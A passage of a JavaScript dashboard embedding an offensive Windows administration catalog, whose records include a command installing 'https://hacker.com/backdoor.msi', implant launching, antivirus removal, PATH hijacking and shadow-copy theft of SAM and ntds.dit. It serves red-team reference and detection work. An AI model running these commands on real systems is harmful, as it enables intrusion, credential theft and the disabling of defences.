auditing", "Specify who can use the RD gateway and to which devices it can be used"], "comments": "Right click on RD Gateway Manager -> Connect to RD Gateway Server -> Remote server: `DC1.ad.bitsadmin.com`", "resources": [], "mitre_techniques": [], "detections": "Port: 135/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 424, "name": "virtmgmt.msc", "type": "MMC", "function": "Manage", "toolsets": ["GUI", "RSAT"], "synopsis": "Hyper-V Manager", "description": "Hyper-V Manager", "commandline": "virtmgmt.msc", "usecases": ["Connect to the console of a server which might be directly accessible because of an `AutoAdminLogon` registry setting, or because an admin has logged onto the console", "Install an unmonitored offensive VM to use to pivot through the network"], "comments": "Right click root node -> Connect to Server -> Remote server -> `HYPERV1.ad.bitsadmin.com`\nUses ports 5985/TCP (WinRM, for management and non-enhanced session) and 2197/TCP (VMRDP for Enhanced Session) - Once a VM screen is opened (little display appears to be rendered over WinRM)\nIf a screen is opened without using the enhanced session functionality, it continues to use WinRM", "resources": [], "mitre_techniques": [], "detections": "Port: 5985/TCP\nPort: 2197/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 425, "name": "wbadmin.msc", "type": "MMC", "function": "Manage", "toolsets": ["GUI", "Server"], "synopsis": "Windows Server Backup", "description": "Windows Server Backup", "commandline": "mmc.exe", "usecases": ["Purge backups?"], "comments": "mmc.exe -> File -> Add/Remove Snap-In -> Windows Server Backup -> Add -> Another computer: `DC1.ad.bitsadmin.com` -> Finish -> OK", "resources": [], "mitre_techniques": ["T1485"], "detections": "Port: 135/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 426, "name": "winsmgmt.msc", "type": "MMC", "function": "Manage", "toolsets": ["GUI", "RSAT"], "synopsis": "WINS", "description": "WINS", "commandline": "winsmgmt.msc", "usecases": [], "comments": "Right click -> Add Server -> WINS server: `DC1.ad.bitsadmin.com` -> OK -> The specified server name could not be validated\nTo add this server to the console, type the IP address: `10.0.10.10` -> OK", "resources": [], "mitre_techniques": [], "detections": "Port: 445/TCP\nPort: 135/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 427, "name": "wsecedit.dll", "type": "MMC", "function": "Manage", "toolsets": ["Builtin", "GUI"], "synopsis": "Security Configuration and Analysis", "description": "Security Configuration and Analysis", "commandline": "mmc.exe", "usecases": [], "comments": "Open via MMC's Add/Remove Snap-In -> Security Configuration and Analysis -> OK\nRight click the node -> Open Database -> Enter whatever name -> Open -> Open the .inf file", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 428, "name": "wsecedit.dll", "type": "MMC", "function": "Manage", "toolsets": ["Builtin", "GUI"], "synopsis": "Security Configuration and Analysis", "description": "Security Templates", "commandline": "mmc.exe", "usecases": [], "comments": "Open via MMC's Add/Remove Snap-In -> Security Configuration and Analysis -> OK\nUsed to create .inf files from [secpol.msc](../secpol) settings", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 429, "name": "wsus.msc", "type": "MMC", "function": "Manage", "toolsets": ["GUI", "RSAT"], "synopsis": "Update Services", "description": "Update Services", "commandline": "wsus.msc", "usecases": ["Deploy malicious updates"], "comments": "Right click -> Connect to Server\nPort 5830/TCP is used in case of HTTP, port 5831/TCP is used in case of TLS", "resources": [], "mitre_techniques": [], "detections": "Port: 5830/TCP\nPort: 5831/TCP", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 430, "name": "ospp.vbs", "type": "Scripts", "function": "Misc", "toolsets": ["Extra"], "synopsis": "Configure volume licensed versions of Office products", "description": "Show Office activation information", "commandline": "cscript.exe ospp.vbs W10.ad.bitsadmin.com /dstatusall", "usecases": [], "comments": "", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 431, "name": "pubprn.vbs", "type": "Scripts", "function": "Manage", "toolsets": ["Builtin", "TODO"], "synopsis": "Publishes a printer to the Active Directory Domain Services", "description": "", "commandline": "cscript pubprn.vbs", "usecases": [], "comments": "Script is located in the `%SystemRoot%\\System32\\printing_Admin_Scripts\\<language>` directory", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 432, "name": "slmgr.vbs", "type": "Scripts", "function": "Misc", "toolsets": ["Builtin"], "synopsis": "Obtain volume activation information", "description": "Show Windows activation information", "commandline": "cscript.exe slmgr.vbs W10.ad.bitsadmin.com /dlv", "usecases": [], "comments": "", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 433, "name": "slmgr.vbs", "type": "Scripts", "function": "Misc", "toolsets": ["Builtin"], "synopsis": "Obtain volume activation information", "description": "Uninstall Windows product key", "commandline": "cscript.exe slmgr.vbs W10.ad.bitsadmin.com /upk", "usecases": ["Cripple Windows activation to maybe have an admin user connect to the system to fix it"], "comments": "", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 434, "name": "winrm.cmd", "type": "Scripts", "function": "Processes", "toolsets": ["Builtin"], "synopsis": "Windows Remote Management", "description": "Check process details", "commandline": "winrm.vbs get wmicimv2/Win32_Process?Handle=3456 -r:W10.ad.bitsadmin.com", "usecases": ["Reconnaissance on running processes"], "comments": "", "resources": [], "mitre_techniques": ["T1057", "T1021.006"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 435, "name": "winrm.cmd", "type": "Scripts", "function": "Execute", "toolsets": ["Builtin"], "synopsis": "Windows Remote Management", "description": "Lauch process", "commandline": "winrm.vbs invoke Create wmicimv2/Win32_Process -r:W10.ad.bitsadmin.com @{CommandLine=\"notepad.exe\";CurrentDirectory=\"C:\\\"}", "usecases": ["After having copied an implant over SMB, launch it"], "comments": "", "resources": [], "mitre_techniques": ["T1047", "T1021.006"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 436, "name": "CIM_DataFile", "type": "WMI", "function": "Data", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Type of logical file that is a named collection of data or executable code", "description": "Locate files", "commandline": "Get-CimInstance -Query \"Select * from CIM_DataFile Where ((Drive = 'C:') AND (FileName = 'ntuser') AND (Extension = 'dat'))\" -CimSession $s", "usecases": ["Perform reconaissance on filesystem"], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nPretty slow\nNamespace: `ROOT\\Cimv2`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2024-12-13"}, {"id": 437, "name": "CIM_DataFile", "type": "WMI", "function": "Data", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Type of logical file that is a named collection of data or executable code", "description": "Copy file", "commandline": "$f = Get-CimInstance -ClassName CIM_DataFile -Filter \"Name='C:\\\\Unattend.xml'\" -CimSession $s\n$f | Invoke-CimMethod -Name Copy -Arguments @{FileName='C:\\\\Users\\\\Public\\\\Unattend.xml'}", "usecases": ["Copy file to Public share to copy it from there"], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2024-12-13"}, {"id": 438, "name": "CIM_Directory", "type": "WMI", "function": "Data", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Type of file that logically groups data files 'contained' in it, and provides path information for the grouped files", "description": "", "commandline": "", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nNamespace: `ROOT\\Cimv2`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 439, "name": "CIM_LogicalFile", "type": "WMI", "function": "Data", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Represents a named collection of data located in a file system on a storage extent", "description": "", "commandline": "", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nNamespace: `ROOT\\Cimv2`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 440, "name": "MSFT_DNSClientCache", "type": "WMI", "function": "Network", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Represents a record in a DNS client cache", "description": "List cached DNS entries", "commandline": "Get-CimInstance -Namespace ROOT\\StandardCimv2 -ClassName MSFT_DNSClientCache -CimSession $s", "usecases": ["Reconnaissance on the network/Internet activities on the computer"], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nSee also [Get-DnsClientCache](../../Cmdlets/Get-DnsClientCache)\nNamespace: `ROOT\\StandardCimv2`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 441, "name": "MSFT_NetFirewallRule", "type": "WMI", "function": "Manage", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Represents a Windows firewall rule", "description": "Enable firewall rule", "commandline": "$fwrule = Get-CimInstance -Namespace ROOT\\StandardCimv2 -ClassName MSFT_NetFirewallRule -Filter 'DisplayName=\"Remote Desktop - Shadow (TCP-In)\"' -CimSession $s\n$fwrule\n$fwrule | Invoke-CimMethod -MethodName Enable", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nNamespace: `ROOT\\StandardCimv2`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 442, "name": "StdRegProv", "type": "WMI", "function": "Registry", "toolsets": ["Builtin", "CIMSession"], "synopsis": "The StdRegProv class contains methods that manipulate system registry keys and values", "description": "Query value", "commandline": "Invoke-CimMethod -ClassName StdRegProv -MethodName GetDWORDValue -Arguments @{hDefKey=[uint32]2147483650; sSubKeyName=\"Software\\Policies\\Microsoft\\Windows NT\\Terminal Services\"; sValueName=\"Shadow\"} -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nNamespace: `ROOT\\Cimv2`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 443, "name": "StdRegProv", "type": "WMI", "function": "Registry", "toolsets": ["Builtin", "CIMSession"], "synopsis": "The StdRegProv class contains methods that manipulate system registry keys and values", "description": "Set value", "commandline": "Invoke-CimMethod -ClassName StdRegProv -MethodName SetDWORDValue -Arguments @{hDefKey=[uint32]2147483650; sSubKeyName=\"Software\\Policies\\Microsoft\\Windows NT\\Terminal Services\"; sValueName=\"Shadow\"; uValue=[uint32]2} -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nNamespace: `ROOT\\Cimv2`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 444, "name": "StdRegProv", "type": "WMI", "function": "Registry", "toolsets": ["Builtin", "CIMSession"], "synopsis": "The StdRegProv class contains methods that manipulate system registry keys and values", "description": "Delete value", "commandline": "Invoke-CimMethod -ClassName StdRegProv -MethodName DeleteValue -Arguments @{hDefKey=[uint32]2147483650; sSubKeyName=\"Software\\Policies\\Microsoft\\Windows NT\\Terminal Services\"; sValueName=\"Shadow\"} -CimSession $s", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nNamespace: `ROOT\\Cimv2`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 445, "name": "Win32_DfsNode", "type": "WMI", "function": "Data", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Represents a root or a link of a domain based or a standalone distributed file system (DFS)", "description": "", "commandline": "", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nNamespace: `ROOT\\Cimv2`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 446, "name": "Win32_Environment", "type": "WMI", "function": "Manage", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Represents an environment or system environment setting on a Windows computer system", "description": "Set environment variable", "commandline": "New-CimInstance -ClassName Win32_Environment -Property @{Name=\"PATH\";VariableValue=\"C:\\hackertools; C:\\Windows\\System32;C:\\Windows\";UserName=\"<SYSTEM>\"} -CimSession $s", "usecases": ["Change PATH environment variable for search order hijacking"], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nFor the VariableValue, first obtain the current `PATH` using `Get-CimInstance` and then prefix it with the malicious path\nNamespace: `ROOT\\Cimv2`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 447, "name": "Win32_NTLogEvent", "type": "WMI", "function": "Logs", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Displays the Windows Event Log", "description": "List logons on a system", "commandline": "Get-CimInstance -ClassName Win32_NTLogEvent -Filter \"LogFile = 'Security' AND EventCode = '4624'\" -CimSession $s", "usecases": ["Understand which accounts are used on a system"], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 448, "name": "Win32_OperatingSystem", "type": "WMI", "function": "Recon", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Represents a Windows-based operating system installed on a computer", "description": "Information about OS", "commandline": "Get-CimInstance Win32_OperatingSystem -CimSession $s | fl *", "usecases": ["Reconnaissance of target operating system"], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nSee also [systeminfo.exe](../../Binaries/systeminfo)\nNamespace: `ROOT\\Cimv2`\nAlternative: `CIM_OperatingSystem`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 449, "name": "Win32_Process", "type": "WMI", "function": "Execute", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Represents a process on an operating system", "description": "Launch executable", "commandline": "Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = 'C:\\tmp\\implant.exe'} -CimSession $s", "usecases": ["Launch implant"], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nNamespace: `ROOT\\Cimv2`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 450, "name": "Win32_Process", "type": "WMI", "function": "Processes", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Represents a process on an operating system", "description": "List running processes", "commandline": "Get-CimInstance -ClassName Win32_Process -CimSession $s | select ProcessId,Name,CommandLine | ft * -AutoSize -Wrap", "usecases": ["Launch implant"], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nNamespace: `ROOT\\Cimv2`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 451, "name": "Win32_Product", "type": "WMI", "function": "Manage", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Represent products as they are installed by MSI", "description": "List installed software", "commandline": "Get-CimInstance -ClassName Win32_Product -CimSession $s | Select-Object Caption,Vendor,Version,InstallLocation", "usecases": ["Perform reconnaissance on installed security software"], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nNamespace: `ROOT\\Cimv2`", "resources": ["https://blog.bitsadmin.com/living-off-the-foreign-land-windows-as-offensive-platform-part-3#execute-command-lines"], "mitre_techniques": ["T1218.007"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-08-25"}, {"id": 452, "name": "Win32_Product", "type": "WMI", "function": "Execute", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Represent products as they are installed by MSI", "description": "Install software", "commandline": "Invoke-CimMethod -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation=\"https://hacker.com/backdoor.msi\"; Options=\"\"; AllUsers=$true} -CimSession $s", "usecases": ["Launch and install malicious .msi package"], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nNamespace: `ROOT\\Cimv2`\n.msi file needs to be available on the target host", "resources": ["https://blog.bitsadmin.com/living-off-the-foreign-land-windows-as-offensive-platform-part-3#execute-command-lines"], "mitre_techniques": ["T1218.007"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-08-25"}, {"id": 453, "name": "Win32_Product", "type": "WMI", "function": "Manage", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Represent products as they are installed by MSI", "description": "Uninstall software", "commandline": "Get-CimInstance Win32_Product -Filter 'Caption=\"Antivirus Software caption\"' -CimSession $s | Remove-CimInstance", "usecases": ["Remove security software"], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nNamespace: `ROOT\\Cimv2`", "resources": ["https://blog.bitsadmin.com/living-off-the-foreign-land-windows-as-offensive-platform-part-3#execute-command-lines"], "mitre_techniques": ["T1218.007", "T1562.001"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-08-25"}, {"id": 454, "name": "Win32_QuickFixEngineering", "type": "WMI", "function": "Recon", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Represents a small system-wide update, commonly referred to as a quick-fix engineering (QFE) update, applied to the current operating system", "description": "List of installed KBs", "commandline": "Get-CimInstance Win32_QuickFixEngineering -CimSession $s", "usecases": ["List OS info and installed security updates and feed them to WES-NG to identify vulnerabilities"], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nSee also [systeminfo.exe](../../Binaries/systeminfo)\nNamespace: `ROOT\\Cimv2`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 455, "name": "Win32_Service", "type": "WMI", "function": "Execute", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Represents a service on a computer system running Windows", "description": "Start service", "commandline": "$tssvc = Get-CimInstance -Filter 'Name=\"TermService\"' -ClassName Win32_Service -CimSession $s\n$tssvc\n$tssvc | Invoke-CimMethod -MethodName StartService", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nNamespace: `ROOT\\Cimv2`", "resources": [], "mitre_techniques": ["T1569.002"], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 456, "name": "Win32_Service", "type": "WMI", "function": "Processes", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Represents a service on a computer system running Windows", "description": "List services", "commandline": "Get-CimInstance -ClassName Win32_Service -CimSession $s", "usecases": ["Reconnaissance on installed services"], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 457, "name": "Win32_Service", "type": "WMI", "function": "Processes", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Represents a service on a computer system running Windows", "description": "Obtain a specific service instance", "commandline": "Get-CimInstance -Filter 'Name=\"TermService\"' -ClassName Win32_Service -CimSession $s", "usecases": ["Start or stop a service"], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 458, "name": "Win32_Service", "type": "WMI", "function": "Execute", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Represents a service on a computer system running Windows", "description": "Create new service", "commandline": "Invoke-WmiMethod -Class Win32_Service -Name Create -ArgumentList $false,\"Print Spooler (x64)\",([byte]1),$null,$null,\"spoolsv64\",\"C:\\Windows\\System32\\cmd.exe /c powershell -e bHM=\",$null,([byte]16),\"Manual\",\"NT AUTHORITY\\SYSTEM\",", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 459, "name": "Win32_ShadowCopy", "type": "WMI", "function": "Data", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Storage extent that represents a duplicate copy of the original volume at a previous time", "description": "Create new shadow copy", "commandline": "$r = Invoke-CimMethod -ClassName Win32_ShadowCopy -MethodName Create -Arguments @{Volume='C:\\'} -CimSession $s\n$r", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nNamespace: `ROOT\\Cimv2`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 460, "name": "Win32_ShadowCopy", "type": "WMI", "function": "Data", "toolsets": ["Builtin", "CIMSession"], "synopsis": "Storage extent that represents a duplicate copy of the original volume at a previous time", "description": "Show details of a volume shadow copy", "commandline": "Get-CimInstance -ClassName Win32_ShadowCopy -CimSession $s -Filter \"ID=`\"$($r.ShadowID)`", "usecases": ["Get shadow copy details for use with [Copy-Item](../../Cmdlets/Copy-Item) to obtain `SAM`/`SYSTEM`/`SECURITY`/`ntds.dit` files"], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nNamespace: `ROOT\\Cimv2`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}, {"id": 461, "name": "Win32_SystemDriver", "type": "WMI", "function": "Processes", "toolsets": ["Builtin", "CIMSession", "TODO"], "synopsis": "Represents the system driver for a base service", "description": "", "commandline": "", "usecases": [], "comments": "Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)\nNamespace: `ROOT\\Cimv2`", "resources": [], "mitre_techniques": [], "detections": "", "contributors": "Arris Huijgen (@bitsadmin)", "updated": "2023-07-01"}];

// State management for search, filters, and sorting
const dashboardState = {
    searchQuery: '',
    selectedType: 'all',
    selectedFunction: 'all',
    sortKey: 'name',
    sortAsc: true,
    currentPage: 1,
    recordsPerPage: 25
};

/**
 * Initialize the dashboard on page load
 * Sets up event listeners and renders initial data
 */
function initDashboard() {
    console.log('Initializing LOLVERSE Dashboard...');
    
    // Setup search input
    const searchInput = document.getElementById('search-input');
    searchInput.addEventListener('input', (e) => {
        dashboardState.searchQuery = e.target.value.toLowerCase();
        dashboardState.currentPage = 1;
        renderTable();
    });
    
    // Extract unique types and functions for filter buttons
    const types = [...new Set(allRecords.map(r => r.type))].sort();
    const functions = [...new Set(allRecords.map(r => r.function))].sort();
    
    // Generate filter buttons
    const filterContainer = document.getElementById('filter-buttons');
    
    // Add "All" button
    const allBtn = document.createElement('button');
    allBtn.className = 'filter-btn active';
    allBtn.textContent = 'All Records';
    allBtn.dataset.type = 'all';
    allBtn.addEventListener('click', () => {
        dashboardState.selectedType = 'all';
        dashboardState.selectedFunction = 'all';
        dashboardState.currentPage = 1;
        updateFilterButtons();
        renderTable();
    });
    filterContainer.appendChild(allBtn);
    
    // Add type filters
    types.forEach(type => {
        const btn = document.createElement('button');
        btn.className = 'filter-btn';
        btn.textContent = type || 'N/A';
        btn.dataset.type = type;
        btn.addEventListener('click', () => {
            dashboardState.selectedType = type;
            dashboardState.selectedFunction = 'all';
            dashboardState.currentPage = 1;
            updateFilterButtons();
            renderTable();
        });
        filterContainer.appendChild(btn);
    });
    
    // Setup sorting
    document.querySelectorAll('th.sortable').forEach(th => {
        th.addEventListener('click', () => {
            const sortKey = th.dataset.sort;
            
            // Toggle sort direction if same column clicked
            if (dashboardState.sortKey === sortKey) {
                dashboardState.sortAsc = !dashboardState.sortAsc;
            } else {
                dashboardState.sortKey = sortKey;
                dashboardState.sortAsc = true;
            }
            
            dashboardState.currentPage = 1;
            renderTable();
        });
    });
    
    // Setup pagination controls
    document.getElementById('prev-page-btn').addEventListener('click', () => {
        if (dashboardState.currentPage > 1) {
            dashboardState.currentPage--;
            renderTable();
            document.getElementById('records-table').scrollIntoView({ behavior: 'smooth', block: 'start' });
        }
    });
    
    document.getElementById('next-page-btn').addEventListener('click', () => {
        const totalPages = Math.ceil(getFilteredRecords().length / dashboardState.recordsPerPage);
        if (dashboardState.currentPage < totalPages) {
            dashboardState.currentPage++;
            renderTable();
            document.getElementById('records-table').scrollIntoView({ behavior: 'smooth', block: 'start' });
        }
    });
    
    // Initial render
    renderTable();
}

/**
 * Filter records based on current search and filter state
 * @returns {Array} Filtered records
 */
function getFilteredRecords() {
    return allRecords.filter(record => {
        // Text search across multiple fields
        const searchMatch = 
            record.name.toLowerCase().includes(dashboardState.searchQuery) ||
            record.function.toLowerCase().includes(dashboardState.searchQuery) ||
            record.type.toLowerCase().includes(dashboardState.searchQuery) ||
            record.toolsets.join(' ').toLowerCase().includes(dashboardState.searchQuery) ||
            record.synopsis.toLowerCase().includes(dashboardState.searchQuery);
        
        // Type filter
        const typeMatch = dashboardState.selectedType === 'all' || 
                         record.type === dashboardState.selectedType;
        
        // Function filter
        const functionMatch = dashboardState.selectedFunction === 'all' || 
                             record.function === dashboardState.selectedFunction;
        
        return searchMatch && typeMatch && functionMatch;
    });
}

/**
 * Sort records based on current sort state
 * @param {Array} records - Records to sort
 * @returns {Array} Sorted records
 */
function getSortedRecords(records) {
    const sorted = [...records];
    
    sorted.sort((a, b) => {
        const aVal = a[dashboardState.sortKey] || '';
        const bVal = b[dashboardState.sortKey] || '';
        
        // Handle array values
        const aStr = Array.isArray(aVal) ? aVal.join(' ') : String(aVal);
        const bStr = Array.isArray(bVal) ? bVal.join(' ') : String(bVal);
        
        // Case-insensitive comparison
        const comparison = aStr.toLowerCase().localeCompare(bStr.toLowerCase());
        
        return dashboardState.sortAsc ? comparison : -comparison;
    });
    
    return sorted;
}

/**
 * Update filter button active states
 */
function updateFilterButtons() {
    document.querySelectorAll('.filter-btn').forEach(btn => {
        btn.classList.remove('active');
        
        // Highlight active filter
        if (btn.dataset.type === dashboardState.selectedType) {
            btn.classList.add('active');
        }
        
        if (btn.textContent === 'All Records' && 
            dashboardState.selectedType === 'all' && 
            dashboardState.selectedFunction === 'all') {
            btn.classList.add('active');
        }
    });
}

/**
 * Update sort indicators on table headers
 */
function updateSortIndicators() {
    document.querySelectorAll('th.sortable').forEach(th => {
        th.classList.remove('sorted-asc', 'sorted-desc');
        
        if (th.dataset.sort === dashboardState.sortKey) {
            if (dashboardState.sortAsc) {
                th.classList.add('sorted-asc');
            } else {
                th.classList.add('sorted-desc');
            }
        }
    });
}

/**
 * Escape HTML special characters
 * @param {string} text - Text to escape
 * @returns {string} Escaped text
 */
function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

/**
 * Render the table with current filtered and sorted records
 */
function renderTable() {
    const filtered = getFilteredRecords();
    const sorted = getSortedRecords(filtered);
    const tbody = document.getElementById('table-body');
    
    // Calculate pagination
    const totalRecords = sorted.length;
    const totalPages = Math.ceil(totalRecords / dashboardState.recordsPerPage);
    
    // Ensure current page is valid
    if (dashboardState.currentPage > totalPages) {
        dashboardState.currentPage = Math.max(1, totalPages);
    }
    
    // Calculate the start and end index for current page
    const startIndex = (dashboardState.currentPage - 1) * dashboardState.recordsPerPage;
    const endIndex = startIndex + dashboardState.recordsPerPage;
    const pageRecords = sorted.slice(startIndex, endIndex);
    
    // Update record count
    const countSpan = document.getElementById('record-count');
    countSpan.textContent = '(' + totalRecords + ' of ' + allRecords.length + ' records)';
    
    // Update pagination info
    const paginationInfoText = document.getElementById('pagination-info-text');
    if (totalRecords > 0) {
        const displayStart = startIndex + 1;
        const displayEnd = Math.min(endIndex, totalRecords);
        paginationInfoText.textContent = 'Showing ' + displayStart + '-' + displayEnd + ' of ' + totalRecords + ' records';
    } else {
        paginationInfoText.textContent = 'Showing ‚Äî of 462 records';
    }
    
    // Update pagination controls
    document.getElementById('current-page').textContent = totalPages > 0 ? dashboardState.currentPage : '0';
    document.getElementById('total-pages').textContent = totalPages;
    
    const prevBtn = document.getElementById('prev-page-btn');
    const nextBtn = document.getElementById('next-page-btn');
    prevBtn.disabled = dashboardState.currentPage <= 1;
    nextBtn.disabled = dashboardState.currentPage >= totalPages;
    
    // Clear table body
    tbody.innerHTML = '';
    
    // Handle no results
    if (totalRecords === 0) {
        const tr = document.createElement('tr');
        tr.innerHTML = '<td colspan="6" class="no-records"><p>No records found. Try adjusting your filters.</p></td>';
        tbody.appendChild(tr);
        updateSortIndicators();
        return;
    }
    
    // Render each record for current page
    pageRecords.forEach(record => {
        const tr = document.createElement('tr');
        
        // Extract first toolset or show count
        const toolsetDisplay = record.toolsets && record.toolsets.length > 0 
            ? record.toolsets[0] 
            : 'N/A';
        
        // Extract first MITRE technique or show count
        const mitreDisplay = record.mitre_techniques && record.mitre_techniques.length > 0 
            ? record.mitre_techniques[0]
            : 'N/A';
        
        // Build table row HTML with proper escaping
        let toolsetCell = '';
        if (record.toolsets && record.toolsets.length > 0) {
            toolsetCell = record.toolsets.map(function(toolset) {
